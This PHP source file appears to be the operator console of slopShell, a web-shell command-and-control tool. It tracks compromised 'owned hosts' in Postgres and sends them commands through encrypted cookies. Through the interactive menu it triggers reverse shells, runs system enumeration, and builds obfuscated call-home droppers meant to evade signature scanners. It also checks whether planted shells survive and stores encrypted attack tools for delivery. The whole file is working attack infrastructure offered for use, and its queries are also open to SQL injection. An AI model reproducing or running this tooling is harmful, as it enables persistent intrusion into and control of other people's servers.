<?php
if (strtolower(php_uname()) == "windows") {
    define('clears', 'cls');
} else {
    define('clears', "clear");
}
require "includes/db/postgres_checker.php";
require "includes/droppers/dynamic_generator.php";
$firstRun = new postgres_checker();
$firstRun->createDB();
$cof = array(
    "useragent" => "sp1.1",
    "proxy" => trim(readline("Proxy?(schema://host:port) Press enter for none->")),
    "host" => "127.0.0.1",
    "port" => "5432",
    "username" => get_current_user(),
    "password" => trim(readline("Password?Press enter for none->")),
    "dbname" => "sloppy_bots",
    "verify_ssl" => trim(readline("Verify SSL?(yes/no)->"))
);
//todo need to figure out why this is no longer working on raspi
//$success = null;
//$te = system("bg $( which bash ) -c 'nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &'", $success);
is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)) : define("config", $cof);
if (empty(config['password'])) {
    define('DBCONN', sprintf("host=%s port=%s user=%s dbname=%s",
        config['host'],
        config['port'],
        config['username'],
        config['dbname']
    ));
} else {
    define('DBCONN', sprintf("host=%s port=%s user=%s password=%s dbname=%s",
        config['host'],
        config['port'],
        config['username'],
        config['password'],
        config['dbname']
    ));
}
try {
    define("CHH", curl_init());
    if (is_null(config['proxy'])) {
        echo "Not setting proxy information";
        curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
    } else {
        curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
        curl_setopt(CHH, CURLOPT_PROXY, config["proxy"]);
    }
    if (config['verify_ssl'] === "no"){
        curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 0);
    }else{
        curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 1);
        curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 1);
    }
} catch (Exception $e) {
    print("{$e}\n\n");
}

function logo($last, $cl, bool $error, $error_value, string $lastHost)
{
    if ($last === "q") {
        system($cl);
        system("killall proxybroker");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
        print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
    } else if (is_null($last)) {
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
        menu();
    } else {
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
        print(sprintf("\033[33;40m  Last Host -> %s", $lastHost) . "\033[0m\n");
        if ($error === true && !empty($error_value)) {
            if (is_array($error_value)) {
                echo("\033[33;40m  What was the error:                                                           \033[0m\n");
                echo "\t" . print_r($error_value);
                echo "\n";
            } else {
                echo("\033[33;40m  User Supplied Values:\n$error_value                                                           \033[0m\n");
            }
        }
        menu();
    }

}

function menu()
{
    echo <<< _MENU
        (O)ptions                                                                   
        (S)ystem enumeration                                                        
        (R)everse shell                                                             
        (C)ommand Execution                                                         
        (CL)oner
        (CR)eate Dropper                                                                  
        (U)pdates  -> not implemented yet.                                                                 
        (A)dd new host                                                              
        (CH)eck if hosts are still pwned
        (AT) Add tool                                            
        (M)ain menu                                                                 
        (Q)uit                                                                      
_MENU;
    echo "\n\n\033[0m\n";

}

function b64($what, $how, $whereWeGo){

}


function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
{
    $c = pg_connect(DBCONN);
    if ($action === "add") {
        if (!empty($pathToFile) && is_file($pathToFile) && !empty($toolName)) {
            $file_parts = pathinfo($pathToFile);
            switch ($file_parts['extension']){
                case "sh":
                    echo "Shell script detected.\n";
                    $toolTarget = 'lin';
                    $language = 'bash/shell scripting';
                    break;
                case "ps1":
                    echo "Powershell script detected.\n";
                    $toolTarget = 'win';
                    $language = 'powershell';
                    break;
                case "py":
                    echo "Python script detected.\n";
                    $toolTarget = "universal";
                    $language = "python";
                    break;
                case "php":
                    echo "PHP script detected.\n";
                    $toolTarget = "universal";
                    $language = "php";
                    break;
                case "exe":
                    echo "Binary file detected.\n";
                    $toolTarget = 'win';
                    $language = 'executable';
                    break;
                case "dll":
                    echo "DLL(Dynamically linked library detected.\n";
                    $toolTarget = 'win';
                    $language = 'linked library';
                    break;
                case "so":
                    echo "Shared Object detected.\n";
                    $toolTarget = 'linux';
                    $language = 'shared object guesing: c/c++';
                    break;
                case "lib":
                    echo "Library detected.\n";
                    $toolTarget = 'linux';
                    $language = 'library object guessing: c/c++';
                    break;
                case "bat":
                    echo "Batch script detected.\n";
                    $toolTarget = 'win';
                    $language = 'batch';
                    break;
                case "vbs":
                    echo "Visual Basic script detected.\n";
                    $toolTarget = 'win';
                    $language = 'visual basic script';
                    break;
            }
            if ($encrypted === true) {
                $algo = "aes-256-gcm";
                $passphrase = openssl_random_pseudo_bytes(32);
                $passphraseHmacTagValue = openssl_random_pseudo_bytes(128);
                $IV = openssl_random_pseudo_bytes((int)openssl_cipher_iv_length($algo));
                $crypted = openssl_encrypt(file_get_contents($pathToFile), $algo, $passphrase, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $IV, $passphraseHmacTagValue, strlen($passphraseHmacTagValue));
                $t = hash_hmac("sha512", $crypted, $binary = true);
                if (empty($toolTarget)){
                    $toolTarget = "unk";
                    $language = "unk";
                }
                $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, encrypted) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
                    $toolName,
                    $toolTarget,
                    base64_encode($crypted),
                    base64_encode($passphrase),
                    base64_encode($passphraseHmacTagValue),
                    base64_encode($IV),
                    base64_encode($algo),
                    $t,
                    $language,
                    true
                );
            } else {
                $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, hmac_hash) VALUES('%s', '%s', '%s', '%s', '%s')",
                    $toolName,
                    $toolTarget,
                    base64_encode(file_get_contents($pathToFile)),
                    $language,
                    hash_hmac("sha512", base64_encode(file_get_contents($pathToFile)), $binary=true)
                );
            }
            pg_exec($c, $SQL_STMT);
        }
    } elseif ($action === "grab") {
        $tgrab = pg_exec($c, "SELECT * FROM sloppy_bots_tools");
        echo str_repeat("+", 35) . "[ OUR TOOLSETS ]" . str_repeat("+", 39) . "\n\n";
        foreach (pg_fetch_all($tgrab) as $ti => $tool){
            if ($tool['encrypted'] == "t"){
                $isEncrypted = "true";
            }else{
                $isEncrypted = "false";
            }
            print(sprintf("ID -> [ ". $tool['id'] ." ] Tool Name-> [ ". $tool['tool_name'] ." ] Target OS -> [ ". $tool['target']. " ] Lang -> [ " . $tool['lang']." ] Encrypted -> [ ". $isEncrypted." ]\n"));
        }
        echo "\n\n" . str_repeat("+", 35) . "[ END OUR TOOLSETS ]" . str_repeat("+", 35) . "\n\n";
        $SQL_GRAB = sprintf("SELECT base64_encoded_tool,keys,tags,iv,cipher,hmac_hash,encrypted FROM sloppy_bots_tools WHERE id = '%s'", trim(readline('Which tool shall we use?(by ID)')));
        try {
            $selected_tool = pg_fetch_row(pg_exec($c, $SQL_GRAB));
        }catch (Exception $toolE){
            echo $toolE->getMessage()."\n";
            echo $toolE->getTraceAsString()."\n";
            echo $toolE->getLine()."\n";
            return 0;
        }
        awesomeMenu();
        b64($selected_tool, 'u', trim(readline("Which host shall we send this tool to?->")));
    }
}

function opts()
{
    $ppg = pg_connect(DBCONN);
    print("\n\nCurrent options enabled:\n\n");
    foreach (config as $temp => $values) {
        print($temp . " => " . $values . "\n");
    }
    print("\n\n" . str_repeat("-", 35) . "\n");
    print("\n\nCurrent DB Status:\n\n");
    if ($ppg == PGSQL_CONNECTION_OK or $ppg == PGSQL_CONNECTION_AUTH_OK) {
        print("\nConnected!");
        print("\nPG Host: " . pg_host($ppg));
        print("\nPG Port: " . pg_port($ppg));
        print("\nPG Ping? " . pg_ping($ppg));
    } else {
        print("Could not connect... ensure the DB is running and we are allowed to connect to it.");
    }
    print("\n\n" . str_repeat("-", 35) . "\n");
    print("\n\nProxybroker?\n\n");
    system("ps aux | grep proxybroker");
    echo "\n";
}

function sys($host)
{
    if (!empty($host)) {
        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
        $axX = pg_fetch_row($tc);
        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1] . "?qs=cqBS");
        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 0);
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)) {
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    logo('enumerate system', clears, false, '', $axX[0]);
                    echo $syst;
                    break;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        logo('s', clears, true, "Host and/or URI was empty, please double check.", $host);
    }
    return 0;
}

function rev($host, $port, $method)
{
    $usePort = null;
    $Ushell = null;
    if (isset($host)) {
        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = '%s'", $host));
        $axX = pg_fetch_row($tc);
        if (empty($port)) {
            $usePort = "1634";
        } else {
            $usePort = $port;
        }
        if (empty($method)) {
            $useMethod = "bash";
        } else {
            $useMethod = $method;
        }
        if (empty($useShell) && $axX[2] == "lin") {
            $useShell = "bash";
        } else {
            $useShell = "cmd";
        }
        echo "[ ++ ] Trying: " . $axX[0] . " on " . $usePort . "[ ++ ]\n";
        $revCommand = base64_encode($useMethod . "." . $usePort . "." . $useShell);
        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(CHH, CURLOPT_POST, true);
        curl_setopt(CHH, CURLOPT_COOKIE, "r={$revCommand}");
        curl_setopt(CHH, CURLOPT_POSTFIELDS, "");
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)) {
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    logo('co', clears, false, '', $axX[0]);
                    echo $syst;
                    break;
                default:
                    logo('co', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n", $axX[0]);
            }

        }
    } else {
        logo('reverse', clears, true, '', $host);
    }

}

function co($command, $host, bool $encrypt)
{
    if ($encrypt === true && !is_null($command)) {
        $our_nonce = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
        $secure_Key = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
        $additionalData = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
        try {
            $un = base64_encode(serialize($command));
            $ct = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($un, $additionalData, $our_nonce, $secure_Key);
            $cr = "2";
            $space_Safe_coms = base64_encode(bin2hex($our_nonce) . "." . bin2hex($secure_Key) . "." . bin2hex($additionalData) . "." . base64_encode($ct));
        } catch (SodiumException $exception) {
            echo $exception->getMessage();
            echo $exception->getTraceAsString();
            echo $exception->getLine();
            return 0;
        }
    } else {
        $cr = "1";
        $space_Safe_coms = base64_encode(serialize(base64_encode($command)));
    }
    if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr)) {
        $tcO = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
        $axX = pg_fetch_row($tcO);
        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(CHH, CURLOPT_POST, true);
        //this is the default value the shell will be looking for, change it make it unique.
        // and for those of you who read the source before you run. Howd ya get so smort.
        curl_setopt(CHH, CURLOPT_COOKIE, "cx={$space_Safe_coms}");
        curl_setopt(CHH, CURLOPT_POSTFIELDS, "cr={$cr}");
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)) {
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    logo('co', clears, false, '', $axX[0]);
                    echo $syst;
                    break;
                default:
                    logo('co', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n", $axX[0]);
            }

        }
    } else {
        $error = array(
            "Command" => $command,
        );
        logo('co', clears, true, $error, $host);
    }
    return 0;
}

function clo($host, $repo, $uri)
{
    if (!empty($host) && !empty($repo) && !empty($uri)) {
        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
        $axX = pg_fetch_row($tc);
        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(CHH, CURLOPT_POST, true);
        curl_setopt(CHH, CURLOPT_POSTFIELDS, "clone=$repo");
        $re = curl_exec(CHH);
        $http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE);
        if (!curl_errno(CHH)) {
            switch ($http_code) {
                case 200:
                    return $re;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }
        } else {
            $errors = array(
                "Host" => $host,
                "Repo" => $repo,
                "Target URI" => $uri,
                "Curl Error" => $http_code
            );
            logo('cloner', clears, true, $errors, $host);
        }
        curl_close(CHH);
    } else {
        $errors = array(
            "Host" => $host,
            "Repo" => $repo,
            "Target URI" => $uri
        );
        logo('cloner', clears, true, $errors, $host);
    }

}

function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
{
    echo "Starting dropper creation\n";
    $file_in = "includes/base.php";
    $slop = getcwd() . "/slop.php";
    $t = new dynamic_generator();
    $inDB = new postgres_checker();
    if (!empty($callHome) && !empty($duration) && !empty($depth) && !empty($obfsucate)) {
        try {
            switch ($obfsucate) {
                case "y":
                    $ob = "includes/droppers/dynamic/obfuscated/" . bin2hex(random_bytes(rand(5, 25))) . ".php";
                    if ((int)$depth > 23) {
                        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n Since you want a higher depth, going to encrypt the payload/shell.\n");
                        $encrypt = true;
                        $depth = 23;
                    } else {
                        print("Trying randomness with {$depth}\n");
                        $encrypt = false;
                    }
                    print("Generated dropper will be: {$ob}\n");
                    $rtValues = $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, $duration, $slop);
                    pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, xorkey) VALUES ('%s', '%s', '%s', '%s', '%s', '%s')", $rtValues['Output File'], $depth,$obfsucate, $duration, $rtValues['Key'].".".$rtValues['IV'].".".$rtValues['tag'], $rtValues['XOR Key']));
                    $inDB->countUsedDomains($callHome);
                    system("ls -lah includes/droppers/dynamic/obfuscated");
                    break;
                case "n":
                    $n = "includes/droppers/dynamic/raw/" . bin2hex(random_bytes(rand(5, 25))) . ".php";
                    print("Generated Dropper will be: {$n}\n");
                    $rtValues = $t->begin_junk($file_in, 0, $n, "n", false, $callHome, $callhomePort, 1000, $slop);
                    system("ls -lah includes/droppers/dynamic/raw");
                    break;
            }

        } catch (Exception $exception) {
            $empty = array(
                "Callhome" => $callHome,
                "Duration" => $duration,
                "Obfuscate" => $obfsucate,
                "Depth" => $depth,
                "Actual Exception" => $exception
            );
            logo('cr', clears, true, $empty, '');
        }

    } else {
        $empty = array(
            "Callhome" => $callHome,
            "Duration" => $duration,
            "Obfuscate" => $obfsucate,
            "Depth" => $depth
        );
        logo('cr', clears, true, $empty, '');
    }
}

function aHo($host, $os, $checkIn)
{
    $t = new postgres_checker();
    if (!empty($host)) {
        $path = parse_url($host);
        if ($t->insertRecord($path['scheme'] . "://" . $path['host'] . ":" . $path['port'], $path['path'], $os, $checkIn, $uuid = '', $action = 'add') != 0) {
            echo "Successfully added: $host";
        } else {
            echo "There was an error. Double checking the database.";
            if (!$t->checkDB()) {
                echo "There is a sevre error in the db, you need to ensure you have it crated.";
                echo "Attempting to re-create or create the DB.";
                $t->createDB();
            } else {
                echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
                $t->getRecord($host);
            }
        }
    } else {
        logo('add host', clears, true, $host, $host);
    }
}

function awesomeMenu()
{
    $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main");
    $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
    echo str_repeat("+", 35) . "[ OWNED HOSTS ]" . str_repeat("+", 39) . "\n\n";
    $a = 0;
    foreach (pg_fetch_all($axx) as $tem => $use) {
        print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
            $use['id'],
            $use['rhost'],
            $use['uri'],
            $use['os_flavor'],
            $use['check_in']

        ));
    }
    pg_free_result($count);
    pg_free_result($axx);
    echo "\n\n" . str_repeat("+", 35) . "[ END OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
}

function check($host, $path, $batch)
{
    $curlHandle = CHH;
    if ($batch === "y") {
        $c = pg_exec(pg_connect(DBCONN), "SELECT rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL");
        $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
        $rows = pg_fetch_all($c);
        echo "Pulling: " . pg_fetch_result($count, null, null) . "\nThis could take awhile.";
        curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        foreach ($rows as $r) {
            echo "\nTrying: {$r['rhost']}{$r['uri']}\n";
            curl_setopt(CHH, CURLOPT_URL, $r['rhost'] . $r['uri'] . "?qs=cqS");
            curl_exec(CHH);
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    echo "{$r['rhost']}{$r['uri']} is still ours!\n";
                    break;
                case 404:
                    echo "{$r['rhost']}{$r['uri']}\nLooks like our shell was caught... sorry..\n";
                    break;
                case 500:
                    echo "{$r['rhost']}{$r['uri']}\nYour useragent was not the correct one... did you forget??\n";
                    break;
                default:
                    echo "Hmm. A status other than what i was looking for was returned on {$r['rhost']}{$r['uri']}, please manually confirm the shell was uploaded.\n";
                    break;
            }
        }
    } elseif ($batch === "n") {
        if (!empty($host) && !empty($path)) {
            $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
            $axX = pg_fetch_row($tc);
            curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1] . "?qs=cqS");
            curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
            curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
            curl_exec(CHH);
            if (!curl_errno(CHH)) {
                switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                    case 200:
                        echo $axX[0] . $axX[1] . " is still ours!\n";
                        break;
                    case 404:
                        echo $axX[0] . $axX[1] . "\nLooks like our shell was caught... sorry..\n";
                        break;
                    case 500:
                        echo $axX[0] . $axX[1] . "\nYour useragent was not the correct one... did you forget??\n";
                        break;
                    default:
                        echo $axX[0] . $axX[1] . "\nHmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                        break;
                }
            }
        }
    } else {
        logo("cr", "", true, "", $host);
    }
}

function queryDB($host, $fetchWhat)
{
    # place holder for the query db function. this will check what information we have about a host, and which options to set.
    # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
    # work in progress.
    # @todo
    if (!empty($host)) {
        try {
            $dbCC = pg_connect(DBCONN);
            switch (strtolower($fetchWhat)) {
                case "ch":
                    $row = pg_fetch_all($dbCC, "SELECT * FROM sloppy_bots_main");
                    pg_close();
                    break;
                case "chR":
                    $row = pg_query($dbCC, sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
                    pg_close();
                    break;
                case "r":
                    $row = pg_query($dbCC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                    pg_close();
                    break;
                default:
                    $row = pg_query($dbCC, sprintf("SELECT rhost, uri FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                    pg_close();
                    break;
            }
            if (!empty($row)) {
                return $row;
            } else {
                return 0;
            }
        } catch (Exception $e) {
            $errors = array(
                "Host" => $host,
                "Fetch What?" => $fetchWhat,
                "Explicit Error" => $e
            );
            logo('query DB', clears, true, $errors, $host);
        }


    } else {
        $errors = array(
            "Host" => $host,
            "Fetch What?" => $fetchWhat
        );
        logo('query DB', clears, true, $errors, $host);
    }
    return 0;
}


$run = true;
logo($lc = null, clears, "", "", '');
while ($run) {
    print("\n\033[33;40mPlease select your choice: \n->");
    echo("\033[0m");
    $pw = trim(fgets(STDIN));
    $lc = $pw;
    logo($lc, clears, "", "", '');
    switch (strtolower($pw)) {
        case "cr":
            system(clears);
            echo("Where are we calling home to? (hostname/ip)->");
            $h_name = trim(fgets(STDIN));
            echo("Which port are we calling home on?");
            $h_port = trim(fgets(STDIN));
            echo("How often should we call home? (int) ->");
            $d_int = trim(fgets(STDIN));
            echo("Do we need to obfuscate? (y/n) ->");
            $osb = trim(fgets(STDIN));
            if (strtolower($osb) == "y") {
                echo("Level of depth? This will add more randomness to the file making it less likely to be caught by signature based scanners. (int) ->");
                $de = trim(fgets(STDIN));
            } else {
                $de = "0";
            }
            createDropper($h_name, $h_port, $d_int, $osb, $de);
            break;
        case "s":
            system(clears);
            awesomeMenu();
            $h = readline("Which host are we checking?\n->");
            try {
                sys($h);
            } catch (Exception $e) {
                logo("s", clears, true, $e, $h);
            }
            break;
        case "r":
            system(clears);
            awesomeMenu();
            $h = readline("Please tell me the host.(default is the host sending this request.)\n->");
            $p = readline("\nWhich port shall we use?(default is 1634)\n->");
            $m = readline("Which method is to be used?(default is bash)\n->");
            if (!empty($h)) {
                rev($h, $p, $m);
            }
            break;
        case "c":
            system(clears);
            try {
                awesomeMenu();
                $h = readline("Which host are we sending the command to?\n->");
                $c = readline("And now the command: \n->");
                $e = readline("Are we needing to encrypt?\n(y/n)->");
                switch (strtolower($e)) {
                    case "y":
                        $encrypt = true;
                        break;
                    default:
                        $encrypt = false;
                        break;
                }
                co($c, $h, $encrypt); // defaulting to false for now. until all apsects of that call are worked out and added to the shell.
            } catch (Exception $e) {
                logo("c", clears, true, $e, $h);
            }
            break;
        case "cl":
            system(clears);
            try {
                awesomeMenu();
                $h = readline("Which host are we interacting with?\n->");
                $rep = readline("Repo to clone?\n->");
                clo($h, $rep, queryDB($h, "cl"));
            } catch (Exception $e) {
                logo("cl", clears, true, $e, $h);
            }
            break;
        case "u":
            system(clears);
            if (strstr(getcwd(), "slopShell") == true) {
                system("git pull");
            } else {
                $homie = readline("Where is slopshell downloaded to?->");
                system("cd {$homie} && git pull");
            }
            break;
        case "a":
            system(clears);
            try {
                $h = readline("Who did we pwn my friend?\n->");
                $o = readline("Do you know the OS?\n->");
                aHo($h, $o, 0);
            } catch (Exception $e) {
                logo("a", clears, true, $e, $h);
            }
            break;
        case "ch":
            system(clears);
            try {
                $b = strtolower(readline("Is this going to be a batch job?(Y/N)\n->"));
                switch ($b) {
                    case "y":
                        echo "Executing batch job!\n";
                        check('0', 'b', "y");
                        break;
                    case "n":
                        echo "Not executing batch job.\n";
                        awesomeMenu();
                        $h = readline("Who is it we need to check on?(based on ID)\n->");
                        check($h, "chR", "n");
                        break;
                    default:
                        logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.\n", '');
                        break;
                }
            } catch (Exception $e) {
                logo("ch", clears, true, $e, '');
            }
            break;
        case "m":
            logo($lc, clears, "", "", '');
            break;
        case "q":
            logo('q', clears, false, '', '');
            $run = false;
            break;
        case "o":
            opts();
            break;
        case "at":
            $add = trim(readline("Do we need to add it to the db? (add/grab) -> "));
            if ($add === "add") {
                $ourTool = trim(readline("Full path to tool-> "));
                $dcrypt = trim(readline("Do we need to encrypt it?-> "));
                if ($dcrypt === 'n') {
                    $encrypt = false;
                } else {
                    $encrypt = true;
                }
                $name = trim(readline("Is there a name for it already, or what do you call it.? ->"));
                sloppyTools($add, $ourTool, $name, $encrypt);
            }else{
                sloppyTools($add, '','','');
            }
            break;
        default:
            logo($lc, clears, "", "", '');
            echo "\033[33;40myou need to select a valid option...\033[0m\n";
    }
}

